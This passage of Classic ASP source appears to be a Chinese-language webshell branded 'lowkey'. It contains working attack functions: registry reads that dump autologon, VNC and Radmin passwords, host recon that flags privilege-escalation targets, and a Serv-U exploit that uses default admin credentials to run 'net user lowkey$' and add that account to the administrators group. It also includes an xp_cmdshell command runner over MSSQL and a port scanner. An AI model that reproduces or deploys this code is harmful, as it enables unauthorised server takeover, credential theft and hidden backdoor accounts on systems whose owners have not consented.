End Function
Function MoveFolder(Path)
Path=Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
CF.MoveFolder Path(0),Path(1)
SI="<center><br><br><br>恭喜lowkey目录"&Path(0)&"移动成功！</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
Function NewFolder(Path)
If Not CF.FolderExists(Path) and Path<>"" Then
CF.CreateFolder Path
SI="<center><br><br><br>恭喜lowkey目录"&Path&"新建成功！</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
End Class
sub getTerminalInfo()
on error resume next
dim wsh
set wsh=createobject("Wscript.Shell")
Response.Write "[网络探测]<br><hr size=1>"
EnableTCPIPKey="HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters"
isEnable=Wsh.Regread(EnableTcpipKey)
If isEnable=0 or isEnable="" Then
Notcpipfilter=1
End If
ApdKey="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind"
Apds=Wsh.RegRead(ApdKey)
If IsArray(Apds) Then 
For i=LBound(Apds) To UBound(Apds)-1
ApdB=Replace(Apds(i),"\Device\","")
Response.Write "网卡"&i&"的序列为:"&ApdB&"<br>"
Path="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\"
IPKey=Path&ApdB&"\IPAddress"
IPaddr=Wsh.Regread(IPKey)
If IPaddr(0)<>"" Then
For j=Lbound(IPAddr) to Ubound(IPAddr)
Response.Write "<li>IP地址"&j&"为:"&IPAddr(j)&"<br>"
Next
Else
Response.Write "<li>IP地址无法读取或没有设置<br>"
End if
GateWayKey=Path&ApdB&"\DefaultGateway"
GateWay=Wsh.Regread(GateWayKey)
If isarray(GateWay) Then
For j=Lbound(Gateway) to Ubound(Gateway)
Response.Write "<li>网关"&j&"为:"&Gateway(j)&"<br>"
Next
Else
Response.Write "<li>默认网关无法读取或没有设置<br>"
End if
DNSKey=Path&ApdB&"\NameServer"
DNSstr=Wsh.RegRead(DNSKey)
If DNSstr<>"" Then
Response.Write "<li>网卡DNS为:"&DNSstr&"<br>"
Else
Response.Write "<li>默认DNS无法读取或没有设置<br>"
End If
if Notcpipfilter=1 Then 
Response.Write "<li>没有Tcp/IP筛选<br>"
else
ETK="\TCPAllowedPorts"
EUK="\UDPAllowedPorts"
FullTCP=Path&ApdB&ETK
FullUDP=path&ApdB&EUK
tcpallow=Wsh.RegRead(FullTCP)
If tcpallow(0)="" or tcpallow(0)=0 Then
Response.Write "<li>允许的TCP端口为:全部<br>"
Else
Response.Write "<li>允许的TCP端口为:"
For j = LBound(tcpallow) To UBound(tcpallow)
Response.Write tcpallow(j)&","
Next
Response.Write "<Br>"
End if
udpallow=Wsh.RegRead(FullUDP)
If udpallow(0)="" or udpallow(0)=0 Then
Response.Write "<li>允许的UDP端口为:全部<br>"
Else
Response.Write "<li>允许的UDP端口为:"
for j = LBound(udpallow) To UBound(udpallow)
Response.Write UDPallow(j)&","
next
Response.Write "<br>"
End if
End if
Response.Write "------------------------------------------------<br>"
Next
end if
Response.Write "<br><br>[特殊端口探测]<br><hr size=1>"
Telnetkey="HKEY_LOCAL_MACHINE\SOFTWARE\ Microsoft\TelnetServer\1.0\TelnetPort"
TlntPort=Wsh.RegRead(TelnetKey)
if TlntPort="" Then Tlnt="23(默认设置)"
Response.Write "<li>Telnet端口:"&Tlntport&"<br>"
TermKey="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber"
TermPort=Wsh.RegRead(TermKey)
If TermPort="" Then TermPort="无法读取.请确认是否为Windows Server版本主机"
Response.Write "<li>Terminal Service端口为:"&TermPort&"<br>"
pcAnywhereKey="HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"
PAWPort=Wsh.RegRead(pcAnywhereKey)
If PAWPort="" then PAWPort="无法获取.请确认主机是否安装pcAnywhere"
Response.Write "<li>PcAnywhere端口为:"&PAWPort&"<br>"
Response.Write "------------------------------------------------------"
Set wsX = Server.CreateObject("WScript.Shell")
Dim terminalPortPath, terminalPortKey, termPort
Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
terminalPortKey = "PortNumber"
termPort = wsX.RegRead(terminalPortPath & terminalPortKey)
RrS"终端服务端口及自动登录<ol>"
If termPort = "" Or Err.Number <> 0 Then 
RRS"无法得到终端服务端口, 请检查权限是否已经受到限制.<br/>"
 Else
RrS"当前终端服务端口: " & termPort & "<br/>"
End If
autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
autoLoginEnableKey = "AutoAdminLogon"
autoLoginUserKey = "DefaultUserName"
autoLoginPassKey = "DefaultPassword"
isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
If isAutoLoginEnable = 0 Then
Else
autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
RrS"自动登录的系统帐户: " & autoLoginUsername & "<br>"
autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
If Err Then
Err.Clear
RrS"False"
End If
RrS"自动登录的帐户密码: " & autoLoginPassword & "<br>"
End If
RrS"</ol>"
Response.Write "<br><br><br>[系统软件探测]<br><hr size=1>"
SoftPath=Wsh.Environment.item("Path")
Pathinfo=lcase(SoftPath)
Response.Write "系统软件支持:"
if Instr(Pathinfo,"perl") Then Response.Write "<li>Perl脚本:支持<br>"
if instr(Pathinfo,"java") Then Response.Write "<li>Java脚本:支持<br>"
if instr(Pathinfo,"microsoft sql server") Then Response.Write "<li>MSSQL数据库服务:支持<br>"
if instr(Pathinfo,"mysql") Then Response.Write "<li>MySQL数据库服务:支持<br>"
if instr(Pathinfo,"oracle") Then Response.Write "<li>Oracle数据库服务:支持<br>"
if instr(Pathinfo,"cfusionmx7") Then Response.Write "<li>CFM服务器:支持<br>"
if instr(Pathinfo,"pcanywhere") Then Response.Write "<li>赛门铁克PcAnywhere控制:支持<br>"
if instr(Pathinfo,"Kill") Then Response.Write "<li>Kill杀毒软件:支持<br>"
if instr(Pathinfo,"kav") Then Response.Write "<li> 金山系列杀毒软件:支持<br>"
if instr(Pathinfo,"antivirus") Then Response.Write "<li>赛门铁克杀毒软件:支持<br>"
if instr(Pathinfo,"rising") Then Response.Write "<li>瑞星系列杀毒软件:支持<br>"
paths=split(SoftPath,";")
Response.Write "------------------------------------<br>"
Response.Write "系统当前路径变量:<br>"
For i=Lbound(paths) to Ubound(paths)
Response.Write "<li>"&paths(i)&"<br>"
next
Response.Write "<br><br>[系统设置探测]<br><hr size=1>"
pcnamekey="HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName"
pcname=wsh.RegRead(pcnamekey)
if pcname="" Then pcname="无法读取主机名.<br>"
Response.Write "<li>当前主机名为:"&pcname&"<br>"
AdminNameKey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AltDefaultUserName"
AdminName=wsh.RegRead(AdminNameKey)
if adminname="" Then AdminName="Administrator"
Response.Write "<li>默认管理员用户名为:"&AdminName&"<br>"
isAutologin="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoAdminLogon"
Autologin=Wsh.RegRead(isAutologin)
if Autologin=0 or Autologin="" Then
Response.Write "<li>用户自动登入:未启用<br>"
Else
Response.Write "<li>用户自动登入:启用<br>"
Admin=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName")
Passwd=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword")
Response.Write "<li type=square>用户名:"&Admin&"<br>"
Response.Write "<li type=square>密码:"&Passwd&"<br>"
End if
displogin=wsh.regRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DontDisplayLastUserName")
If displogin="" or displogin=0 Then disply="是" else disply="否"
Response.Write "<li>是否显示上次登入用户:"&disply&"<br>"
NTMLkey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\NTML"
ntml=Wsh.RegRead(NTMLkey)
if ntml="" Then Ntml=1
Response.Write "<li>Telnet Ntml设置为:"&ntml&"<br>"
hk="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count"
kk=wsh.RegRead(hk)
Response.Write"<li>当前活动网卡为:"&kk&"<br>"
Response.Write "------------------------------------<br><br><br>"
Response.write "[服务器弱点探测]<br><hr>"
Set objComputer = GetObject("WinNT://.")
Set sa = Server.CreateObject("Shell.Application")
objComputer.Filter = Array("Service")
On Error Resume Next
For Each objService In objComputer
if objService.Name="Serv-U" Then
if objService.ServiceAccountName="LocalSystem" Then
Response.Write "<li>服务器中有Serv-U安装,且以LocalSystem权限启动,可以考虑用su.exe工具提权<br>"
End if
End if
if lcase(objService.Name)="apache" Then
if objService.ServiceAccountName="LocalSystem" Then
If instr(Request.ServerVariables("SERVER_SOFTWARE"),"Apache") Then
Response.Write "<li>当前WEB服务器为Apache.可以直接提权<br>"
Else
Response.Write " <li>服务器中有Apache服务存在,启动权限为LocalSystem,可以考虑PHP木马<br>"
End if
end if
End if
if instr(lcase(objService.Name),"tomcat") Then
if objService.ServiceAccountName="LocalSystem" Then
Response.Write "<li>服务器中有Tomcat,且以LocalSystem权限启动,可以考虑使用Jsp木马提权<br>"
End if
End if
if instr(lcase(objService.Name),"winmail") Then
if objService.ServiceAccountName="LocalSystem" Then
Response.Write "<li>服务器中有Magic Winmail,且以LocalSystem权限启动,可以查找WebMail目录,并且写入PHP木马<br>"
End if
End if
Next
Set fso=Server.Createobject("Scripting.FileSystemObject")
Sysdrive=left(Fso.GetspecialFolder(2),2)
servername=wsh.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName")
If fso.FileExists(sysdriver&"\Documents And Settings\All Users\Application Data\Symantec\"&servername&".cif") Then
Response.Write "<li>发现pcAnywhere密码文件,可以从默认目录下载并破解得到pcAnywhere密码"
End if
End Sub
sub ReadREG()
RRS "<form method=post>"
RRS  "注册表键值读取<p>" 
RRS "<input type=hidden value=ReadReg name=theAct>"
RRS "<tr><td colspan=2>&nbsp;"
RRS "<select onChange='this.form.thePath.value=this.value;'>"
RRS "<option value=''>选择自带的键值</option>"
RRS "<option value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName'>ComputerName</option>"
RRS"<option value=""HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Linkage\Bind"">网卡列表</option>"
RRS"<option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter"">Radmin密码</option>"
RRS"<option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Port"">Radmin端口</option>"
RRS"<option value=""HKCU\Software\ORL\WinVNC3\Password"">VNC3密码</option>"
RRS"<option value=""HKCU\Software\ORL\WinVNC3\PortNumber"">VNC3端口</option>"
RRS"<option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\Password"">VNC4密码</option>"
RRS"<option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\PortNumber"">VNC4端口</option>"
RRS"<option value=""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber"">3389端口</option>"
RRS"<option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"">PcAnyW数据端口</option>"
RRS"<option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPStatusPort"">PcAnyW状态端口</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤1</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤2</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤3</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent\LogPath'>Schedule Log</option>"
RRS "<option value='HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List\3389:TCP'>防火开放</option>"
RRS "<option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts'>允许开放的UDP端口</option>"
RRS "<option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts'>允许开放的TCP端口</option>"
RRS "</select><br />"
RRS "&nbsp;<input name=thePath value='' size=80>"
RRS "<input type=button value='读取键值' onclick='this.form.submit()'>"
RRS "</form><hr/>"
if Request("thePath")<>"" then
On Error Resume Next
Set wsX = Server.CreateObject("WScript.Shell")
thePath=Request("thePath")
theArray=wsX.RegRead(thePath)
If IsArray(theArray) Then
For i=0 To UBound(theArray)
RRS "<li>" & theArray(i)
Next
Else
RRS "<li>" & theArray
End If
end if
end sub
Function adminab()
Response.Expires=0
on error resume next '查找Administrators组帐号
Set tN=server.createObject("Wscript.Network")
Set objGroup=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
For Each admin in objGroup.Members
RRS admin.Name&"<br>"
Next
if err then
RRS "人品有问题:Wscript.Network"
end if
End Function
Function suftp()
RRS"<p><center>集成版本信息:lowkey</p>"
RRS"<form name='form1' method='post' action=''>"
RRS"<center>管理员:<input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'><br>"
RRS"<center>管理员密码 :<input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'><br>"
RRS"<center>SERV-U端口:<input name='dport' type='text' class='TextBox' id='dport' value='43958'><br>"
RRS"<center>添加的用户名:<input name='tuser' type='text' class='TextBox' id='tuser' value='lowkey'><br>"
RRS"<center>添加的用户密码:<input name='tpass' type='text' class='TextBox' id='pass' value='lowkey'><br>"
RRS"<center>帐号的所对的路径:<input name='tpath' type='text' class='TextBox' id='tpath' value='C:\'><br>"
RRS"<center>服务端口:<input name='tport' type='text' class='TextBox' id='tport' value='21'><br>"
RRS"<center><input name='radiobutton' type='radio' value='add' checked class='TextBox'>确定添加"
RRS"<center><input type='radio' name='radiobutton' value='del' class='TextBox'>确定删除"
RRS"<p><input name='Submit' type='submit' class='buttom' value='提交'></p></form>"
Usr = request.Form("duser")
pwd = request.Form("dpwd")
port = request.Form("dport")
tuser = request.Form("tuser")
tpass = request.Form("tpass")
tpath = request.Form("tpath")
tport = request.Form("tport")
'Command = request.Form("dcmd")
if request.Form("radiobutton") = "add" Then
leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
'leaves = leaves & "-SETDOMAIN" & vbcrlf & "-Domain=cctv|0.0.0.0|43859|-1|1|0" & vbcrlf & "-TZOEnable=0" & vbcrlf & " TZOKey=" & vbcrlf
leaves = leaves & "-SETUSERSETUP" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & "-User=" & tuser & vbcrlf & "-Password=" & tpass & vbcrlf & _
"-HomeDir=" & tpath & "\" & vbcrlf & "-LoginMesFile=" & vbcrlf & "-Disable=0" & vbcrlf & "-RelPaths=1" & vbcrlf & _
"-NeedSecure=0" & vbcrlf & "-HideHidden=0" & vbcrlf & "-AlwaysAllowLogin=0" & vbcrlf & "-ChangePassword=0" & vbcrlf & _
"-QuotaEnable=0" & vbcrlf & "-MaxUsersLoginPerIP=-1" & vbcrlf & "-SpeedLimitUp=0" & vbcrlf & "-SpeedLimitDown=0" & vbcrlf & _
"-MaxNrUsers=-1" & vbcrlf & "-IdleTimeOut=600" & vbcrlf & "-SessionTimeOut=-1" & vbcrlf & "-Expire=0" & vbcrlf & "-RatioUp=1" & vbcrlf & _
"-RatioDown=1" & vbcrlf & "-RatiosCredit=0" & vbcrlf & "-QuotaCurrent=0" & vbcrlf & "-QuotaMaximum=0" & vbcrlf & _
"-Maintenance=System" & vbcrlf & "-PasswordType=Regular" & vbcrlf & "-Ratios=None" & vbcrlf & " Access=" & tpath & "\|RWAMELCDP" & vbcrlf
'leaves = leaves & "quit" & vbcrlf
'--------
On Error Resume Next
Set xPost = CreateObject("MSXML2.XMLHTTP")
xPost.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost.Send(leaves)
Set xPOST=nothing
RRS ("命令成功执行！！FTP 用户名: " & tuser & " " & "密码: " & tpass & " 路径: " & tpath & " :)<br><BR>")
else
leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & " User=" & tuser & vbcrlf
Set xPost3 = CreateObject("MSXML2.XMLHTTP")
xPost3.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost3.Send(leaves)
Set xPOST3=nothing
end if
End Function
FuncTion mssql()
SI="<br><table width=""100%""><tr class=tr><form name=form method=post action="""">Command<input type=text name=MMD size=35 ><input type=text name=U value=sa><input type=text name=P><input type=submit value=execute></form></tr></table>":response.write SI:SI="":If trim(request.form("MMD"))<>""  Then:password= trim(Request.form("P")):id=trim(Request.form("U")):set adoConn=sERvEr.crEATeobjECT("ADODB.Connection"):adoConn.Open "Provider=SQLOLEDB.1;Password="&password&";User ID="&id:strQuery = "exec master.dbo.xp_cMdsHeLl '" & request.form("MMD") & "'":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:strResult = strResult & chr(13) & recResult(0):recResult.MoveNext:Loop:End if:set recResult = Nothing:strResult = Replace(strResult," ","&nbsp;"):strResult = Replace(strResult,"<","&lt;"):strResult = Replace(strResult,">","&gt;"):strResult = Replace(strResult,chr(13),"<br>"):End if:set adoConn = Nothing:Response.Write request.form("MMD") & "<br>"& strResult:end FuncTion
sub ScanPort()
Server.ScriptTimeout=7776000
if request.Form("port")="" then
PortList="21,23,25,80,110,135,139,445,1433,3389,43958"
else
PortList=request.Form("port")
end if
if request.Form("ip")="" then
IP="127.0.0.1"
else
IP=request.Form("ip")
end if
RRS"<br><p>端口扫描器(如果扫描多个端口,速度比较慢,个人推荐使用CMD)</p><form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'><p>Scan IP:&nbsp;<input name='ip' type='text' class='TextBox' id='ip' value='"&IP&"' size='60'><br>Port List:<input name='port' type='text' class='TextBox' size='60' value='"&PortList&"'><br><br><input name='submit' type='submit' class='buttom' value=' scan '><input name='scan' type='hidden' id='scan' value='111'></p></form>"
If request.Form("scan") <> "" Then
timer1=timer
RRS("<b>扫描报告:</b><br><hr>")
tmp=Split(request.Form("port"),",")
ip=Split(request.Form("ip"),",")
For hu=0 to Ubound(ip)
If InStr(ip(hu),"-")=0 Then
For i=0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ip(hu), tmp(i))
Else
seekx=InStr(tmp(i), "-")
If seekx > 0 Then
startN=Left(tmp(i), seekx - 1 )
endN=Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j=startN To endN
Call Scan(ip(hu), j)
Next
Else
RRS(startN&" or "&endN&" is not number<br>")
End If
Else
RRS(tmp(i)&" is not number<br>")
End If
End If
Next
Else
ipStart=Mid(ip(hu),1,InStrRev(ip(hu),"."))
For xxx=Mid(ip(hu),InStrRev(ip(hu),".")+1,1) to Mid(ip(hu),InStr(ip(hu),"-")+1,Len(ip(hu))-InStr(ip(hu),"-"))
For i=0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ipStart&xxx, tmp(i))
Else
seekx=InStr(tmp(i), "-")
If seekx > 0 Then
startN=Left(tmp(i), seekx - 1 )
endN=Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j=startN To endN
Call Scan(ipStart&xxx,j)
Next
Else
RRS(startN&" or "&endN&" is not number<br>")
End If
Else
RRS(tmp(i)&" is not number<br>")
End If
End If
Next
Next
End If
Next
timer2=timer
thetime=cstr(int(timer2-timer1))
RRS"<hr>Process in "&thetime&" s"
END IF
end sub
Sub Scan(targetip, portNum)
On Error Resume Next
set conn=Server.CreateObject(Sot(5,0))
connstr="Provider=SQLOLEDB.1;Data Source="&targetip &","& portNum &";User ID=lake2;Password=;"
conn.ConnectionTimeout=1
conn.open connstr
If Err Then
If Err.number=-2147217843 or Err.number=-2147467259 Then
If InStr(Err.description, "(Connect()).") > 0 Then
RRS(targetip&":"&portNum&".........关闭<br>")
Else
RRS(targetip&":"&portNum&".........<font color=red>开放</font><br>")
End If
End If
End If
End Sub
Select Case Action
Case "MainMenu":MainMenu()
Case "getTerminalInfo":getTerminalInfo()
Case "PageAddToMdb":PageAddToMdb()
Case "PageCheck":PageCheck()
Case "PageUpFile":PageUpFile()
Case "PageExecute":PageExecute()
Case "FsoFileExplorer":FsoFileExplorer()
Case "AppFileExplorer":AppFileExplorer()
case "ScanPort":ScanPort()
Case "suftp":suftp()
Case "Servu"
SUaction=request("SUaction")
if not isnumeric(SUaction) then response.end
user=trim(request("u"))
pass=trim(request("p"))
port=trim(request("port"))
cmd=trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
f=left(f,2)
end if
ftpport=65500
timeout=3
loginuser="User "&user&vbCrLf
loginpass="Pass "&pass&vbCrLf
deldomain="-DELETEDOMAIN"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&" PortNo="&ftpport&vbCrLf
mt="SITE MAINTENANCE"&vbCrLf
newdomain="-SETDOMAIN"&vbCrLf&"-Domain=goldsun|0.0.0.0|"&ftpport&"|-1|1|0"&vbCrLf&"-TZOEnable=0"&vbCrLf&" TZOKey="&vbCrLf
newuser="-SETUSERSETUP"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&"-PortNo="&ftpport&vbCrLf&"-User=go"&vbCrLf&"-Password=od"&vbCrLf&_
"-HomeDir=c:\\"&vbCrLf&"-LoginMesFile="&vbCrLf&"-Disable=0"&vbCrLf&"-RelPaths=1"&vbCrLf&_
"-NeedSecure=0"&vbCrLf&"-HideHidden=0"&vbCrLf&"-AlwaysAllowLogin=0"&vbCrLf&"-ChangePassword=0"&vbCrLf&_
"-QuotaEnable=0"&vbCrLf&"-MaxUsersLoginPerIP=-1"&vbCrLf&"-SpeedLimitUp=0"&vbCrLf&"-SpeedLimitDown=0"&vbCrLf&_
"-MaxNrUsers=-1"&vbCrLf&"-IdleTimeOut=600"&vbCrLf&"-SessionTimeOut=-1"&vbCrLf&"-Expire=0"&vbCrLf&"-RatioUp=1"&vbCrLf&_
"-RatioDown=1"&vbCrLf&"-RatiosCredit=0"&vbCrLf&"-QuotaCurrent=0"&vbCrLf&"-QuotaMaximum=0"&vbCrLf&_
"-Maintenance=System"&vbCrLf&"-PasswordType=Regular"&vbCrLf&"-Ratios=None"&vbCrLf&" Access=c:\\|RWAMELCDP"&vbCrLf
quit="QUIT"&vbCrLf
newuser=replace(newuser,"c:",f)
select case SUaction
case 1
set a=Server.CreateObject(Sot(13,0))
a.open "GET", "http://127.0.0.1:"&port&"/goldsun/upadmin/s1",True, "", ""
a.send loginuser&loginpass&mt&deldomain&newdomain&newuser&quit
set session("a")=a
RRS"<form method='post' name='goldsun'><input name='u' type='hidden' id='u' value='"&user&"'></td><input name='p' type='hidden' id='p' value='"&pass&"'></td><input name='port' type='hidden' id='port' value='"&port&"'></td><input name='c' type='hidden' id='c' value='"&cmd&"' size='50'><input name='f' type='hidden' id='f' value='"&f&"' size='50'><input name='SUaction' type='hidden' id='SUaction' value='2'></form><script language='javascript'>document.write('<center>正在连接 127.0.0.1:"&port&",使用用户名: "&user&",口令："&pass&"...<center>');setTimeout('document.all.goldsun.submit();',4000);</script>"
case 2
set b=Server.CreateObject(Sot(13,0))
b.open "GET", "http://127.0.0.1:"&ftpport&"/goldsun/upadmin/s2", True, "", ""
b.send "User go"&vbCrLf&"pass od"&vbCrLf&"site exec "&cmd&vbCrLf&quit
set session("b")=b
RRS"<form method='post' name='goldsun'><input name='u' type='hidden' id='u' value='"&user&"'></td><input name='p' type='hidden' id='p' value='"&pass&"'></td><input name='port' type='hidden' id='port' value='"&port&"'></td><input name='c' type='hidden' id='c' value='"&cmd&"' size='50'><input name='f' type='hidden' id='f' value='"&f&"' size='50'><input name='SUaction' type='hidden' id='SUaction' value='3'></form><script language='javascript'>document.write('<br><center>正在提升权限,请等待...,<center>');setTimeout(""document.all.goldsun.submit();"",4000);</script>"
case 3
set c=Server.CreateObject(Sot(13,0))
c.open "GET", "http://127.0.0.1:"&port&"/goldsun/upadmin/s3", True, "", ""
c.send loginuser&loginpass&mt&deldomain&quit
set session("c")=c
RRS"<center>成功与否看人品,提权完毕,已执行了命令：<br><font color=red>"&cmd&"</font><br><br>"
RRS"<input type=button value=' 返回继续 ' onClick=""location.href='?Action=Servu';"">"
RRS"</center>"
case else
on error resume next
set a=session("a"):set b=session("b"):set c=session("c"):a.abort:Set a=Nothing:b.abort:Set b=Nothing:c.abort:Set c=Nothing
RRS"<center><br><form method='post' name='goldsun'><table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'><tr align='center' valign='middle'><td colspan='2'>Serv-U 提升权限 ASP版</td></tr><tr align='center' valign='middle'><td width='100'>用户名:</td><td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td></tr><tr align='center' valign='middle'><td>口 令：</td><td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td></tr><tr align='center' valign='middle'><td>端 口：</td><td><input name='port' type='text' id='port' value='43958'></td></tr><tr align='center' valign='middle'><td>系统路径：</td><td><input name='f' type='text' id='f' value='"&f&"' size='8'></td></tr><tr align='center' valign='middle'><td>命　令：</td><td><input name='c' type='text' id='c' value='cmd /c net user lowkey$ lowkey /add&net localgroup administrators lowkey$ /add' size='50'></td></tr><tr align='center' valign='middle'><td colspan='2'><input type='submit' name='Submit' value='提交'><input type='reset' name='Submit2' value='重置'><input name='SUaction' type='hidden' id='action' value='1'></td></tr></table></form></center>"
end select
function Gpath()
on error resume next
err.clear:set f=Server.CreateObject(Sot(0,0))
if err.number>0 then:gpath="c:":exit function:end if:gpath=f.GetSpecialFolder(0):gpath=lcase(left(gpath,2)):set f=nothing
end function
Case "kmuma"
dim Report
if request.QueryString("act")<>"scan" then
RRS "<BR><b>网站根目录</b>- "&Server.MapPath("/")&"<br><b>本程序目录</b>- "&Server.MapPath(".")&"<form action='?Action=kmuma&act=scan' method='post' name='form1'><p><b>检查路径：</b><input name='path' type='text' style='border:1px solid #999' value='\' size='30' /> “\”网站根目录；“.”本程序目录<br><br><b>文件类型：</b><input name='Search_FileExt' type='text' style='border:1px solid #999' value='asp,cer,asa,cdx,php,aspx' size='30'> 类型之间用,隔开，*表示所有类型<br><br><b>文件大小：</b><input name='Search_Maxfilesize' type='text' style='border:1px solid #999' value='512000' size='30'> 默认<=500KB<br><br>你要干什么: <input class=c name='radiobutton' type='radio' value='sws' onClick=""document.getElementById('showFile1').style.display=''"" checked>查ASP 马<input class=c type='radio' name='radiobutton' value='sf' onClick=""document.getElementById('showFile1').style.display=''"">搜索符合条件之文件<br><br /><div id='showFile1' style='display:'>&nbsp;&nbsp;查找内容：<input name='Search_Content' type='text' id='Search_Content' style='border:1px solid #999' size='20'>要查找的字符串，不填就只进行日期检查<br />&nbsp;&nbsp;修改日期：<input name='Search_Date' type='text' style='border:1px solid #999' value='"&Left(Now(),InStr(now()," ")-1)&"' size='20'> 多个日期用;隔开，任意日期填写 <a href='#' onClick=""javascript:form1.Search_Date.value='all'""><font color=red>all</font></a><br /><br /></div><input type='submit' value='开始扫描' style='background:#ccc;border:2px solid #fff;padding:2px 2px 0px 2px;margin:4px;' /></form>"
else
if request.Form("path")="" then
RRS("路径不能为空"):response.End()
end if
if request.Form("path")="\" then
TmpPath=Server.MapPath("\")
elseif request.Form("path")="." then
TmpPath=Server.MapPath(".")
else
TmpPath=request.Form("path")
end if:timer1=timer:Sun=0:SumFiles=0:SumFolders=1
If request.Form("radiobutton")="sws" Then
DimFileExt=request.Form("Search_FileExt")
maxfilesize=Int(request.Form("Search_Maxfilesize"))
Call ShowAllFile(TmpPath)
Else
If request.Form("path")="" or request.Form("Search_Date")="" or request.Form("Search_FileExt")="" Then
RRS("缉捕条件不完全<br><br><a href='javascript:history.go(-1);'>请返回重新输入</a>")
response.End()
End If
DimFileExt=request.Form("Search_FileExt")
maxfilesize1=Int(request.Form("Search_Maxfilesize"))
Call ShowAllFile2(TmpPath)
End If
